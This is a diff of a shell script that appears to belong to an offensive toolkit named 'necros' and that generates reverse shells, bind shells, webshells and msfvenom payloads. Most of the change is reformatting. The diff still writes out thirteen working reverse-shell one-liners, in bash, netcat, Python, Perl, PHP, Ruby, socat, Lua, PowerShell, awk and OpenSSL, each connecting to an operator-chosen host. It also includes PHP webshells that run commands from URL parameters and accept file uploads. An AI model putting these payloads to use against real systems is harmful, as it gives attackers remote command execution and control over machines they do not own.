@@ -4,12 +4,22 @@
 #  Interactive reverse/bind shell & payload generator.
 # ============================================================================
 
+# This file emits payload templates in other languages (Perl, PHP, Ruby, ...).
+# Those literals legitimately contain `$name` tokens that must NOT be expanded
+# by the shell; values are injected only through printf %s. So single-quoted
+# `$` here is intentional, not a bug.
+# shellcheck disable=SC2016
+
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 _LIB="${SCRIPT_DIR}/../lib/necros-common.sh"
 [ -f "$_LIB" ] || _LIB="/usr/local/necros/lib/necros-common.sh"
 # shellcheck source=../lib/necros-common.sh
 . "$_LIB" 2>/dev/null || {
-    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    RED='\033[0;31m'
+    GREEN='\033[0;32m'
+    YELLOW='\033[1;33m'
+    CYAN='\033[0;36m'
+    NC='\033[0m'
 }
 
 # Auto-detect local IP
@@ -36,19 +46,19 @@ EOF
 # ---------------------------------------------------------------------------
 gen_reverse() {
     case "$1" in
-        1)  printf 'bash -i >& /dev/tcp/%s/%s 0>&1\n' "$LHOST" "$LPORT" ;;
-        2)  printf 'bash -i >& /dev/udp/%s/%s 0>&1\n' "$LHOST" "$LPORT" ;;
-        3)  printf 'nc -e /bin/sh %s %s\n' "$LHOST" "$LPORT" ;;
-        4)  printf 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n' "$LHOST" "$LPORT" ;;
-        5)  printf 'python3 -c '\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'\''\n' "$LHOST" "$LPORT" ;;
-        6)  printf 'perl -e '\''use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\''\n' "$LHOST" "$LPORT" ;;
-        7)  printf 'php -r '\''$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");'\''\n' "$LHOST" "$LPORT" ;;
-        8)  printf 'ruby -rsocket -e'\''f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'\''\n' "$LHOST" "$LPORT" ;;
-        9)  printf 'socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:%s:%s\n' "$LHOST" "$LPORT" ;;
+        1) printf 'bash -i >& /dev/tcp/%s/%s 0>&1\n' "$LHOST" "$LPORT" ;;
+        2) printf 'bash -i >& /dev/udp/%s/%s 0>&1\n' "$LHOST" "$LPORT" ;;
+        3) printf 'nc -e /bin/sh %s %s\n' "$LHOST" "$LPORT" ;;
+        4) printf 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n' "$LHOST" "$LPORT" ;;
+        5) printf 'python3 -c '\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'\''\n' "$LHOST" "$LPORT" ;;
+        6) printf 'perl -e '\''use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\''\n' "$LHOST" "$LPORT" ;;
+        7) printf 'php -r '\''$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");'\''\n' "$LHOST" "$LPORT" ;;
+        8) printf 'ruby -rsocket -e'\''f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'\''\n' "$LHOST" "$LPORT" ;;
+        9) printf 'socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:%s:%s\n' "$LHOST" "$LPORT" ;;
         10) printf 'lua -e '\''local s=require("socket");local t=assert(s.tcp());t:connect("%s",%s);[[ ... ]];while true do local r,x=t:receive();local f=assert(io.popen(r,"r"));local b=assert(f:read("*a"));t:send(b);end;f:close();t:close();'\''\n' "$LHOST" "$LPORT" ;;
         11) printf 'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('\''%s'\'',%s);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'\''PS '\''+([Environment]::CurrentDirectory)+'\''> '\'';$sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"\n' "$LHOST" "$LPORT" ;;
         12) printf 'awk '\''BEGIN{s="/inet/tcp/0/%s/%s";while(42){do{printf "shell>"|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")close(s)}}'\''\n' "$LHOST" "$LPORT" ;;
-        13) printf 'openssl s_client -quiet -connect %s:%s|/bin/sh|openssl s_client -quiet -connect %s:%s\n' "$LHOST" "$LPORT" "$LHOST" "$((LPORT+1))" ;;
+        13) printf 'openssl s_client -quiet -connect %s:%s|/bin/sh|openssl s_client -quiet -connect %s:%s\n' "$LHOST" "$LPORT" "$LHOST" "$((LPORT + 1))" ;;
     esac
 }
 
@@ -63,7 +73,8 @@ gen_bind() {
 gen_webshell() {
     case "$1" in
         1) printf '<?php system($_GET["cmd"]); ?>\n' ;;
-        2) cat <<'WS2'
+        2)
+            cat <<'WS2'
 <?php
 if(isset($_FILES['f'])){move_uploaded_file($_FILES['f']['tmp_name'],basename($_FILES['f']['name']));}
 if(isset($_GET['cmd'])){echo '<pre>'.shell_exec($_GET['cmd']).'</pre>';}
@@ -107,10 +118,10 @@ output_payload() {
     echo ""
     # Copy to clipboard if available
     if command -v xclip >/dev/null 2>&1; then
-        printf '%s' "$1" | xclip -selection clipboard 2>/dev/null && \
+        printf '%s' "$1" | xclip -selection clipboard 2>/dev/null &&
             printf '%s[+]%s Copié dans le clipboard\n' "$CYAN" "$NC"
     elif command -v xsel >/dev/null 2>&1; then
-        printf '%s' "$1" | xsel --clipboard 2>/dev/null && \
+        printf '%s' "$1" | xsel --clipboard 2>/dev/null &&
             printf '%s[+]%s Copié dans le clipboard\n' "$CYAN" "$NC"
     fi
 }
@@ -185,8 +196,15 @@ EOF
             5) submenu "LISTENERS & UPGRADE" gen_listener 6 \
                 "Netcat Listener" "Socat PTY Listener" "rlwrap Listener" \
                 "Python PTY Spawn" "Script PTY" "Full TTY Upgrade Steps" ;;
-            6) config_menu; printf '\nAppuyez sur Entrée...'; read -r _ ;;
-            0) printf '%s💀 À bientôt, Nécromancien.%s\n' "$CYAN" "$NC"; exit 0 ;;
+            6)
+                config_menu
+                printf '\nAppuyez sur Entrée...'
+                read -r _
+                ;;
+            0)
+                printf '%s💀 À bientôt, Nécromancien.%s\n' "$CYAN" "$NC"
+                exit 0
+                ;;
         esac
     done
 }
@@ -213,13 +231,34 @@ EOF
 # Parse CLI
 while [ $# -gt 0 ]; do
     case "$1" in
-        --lhost) LHOST="$2"; shift ;;
-        --lport) LPORT="$2"; shift ;;
-        -h|--help) show_help; exit 0 ;;
-        reverse) [ -n "$2" ] && { gen_reverse "$2"; exit 0; } ;;
-        bind)    [ -n "$2" ] && { gen_bind "$2"; exit 0; } ;;
-        web)     [ -n "$2" ] && { gen_webshell "$2"; exit 0; } ;;
-        msf)     [ -n "$2" ] && { gen_msfvenom "$2"; exit 0; } ;;
+        --lhost)
+            LHOST="$2"
+            shift
+            ;;
+        --lport)
+            LPORT="$2"
+            shift
+            ;;
+        -h | --help)
+            show_help
+            exit 0
+            ;;
+        reverse) [ -n "$2" ] && {
+            gen_reverse "$2"
+            exit 0
+        } ;;
+        bind) [ -n "$2" ] && {
+            gen_bind "$2"
+            exit 0
+        } ;;
+        web) [ -n "$2" ] && {
+            gen_webshell "$2"
+            exit 0
+        } ;;
+        msf) [ -n "$2" ] && {
+            gen_msfvenom "$2"
+            exit 0
+        } ;;
         listen)
             if [ -n "$2" ]; then gen_listener "$2"; else gen_listener 1; fi
             exit 0
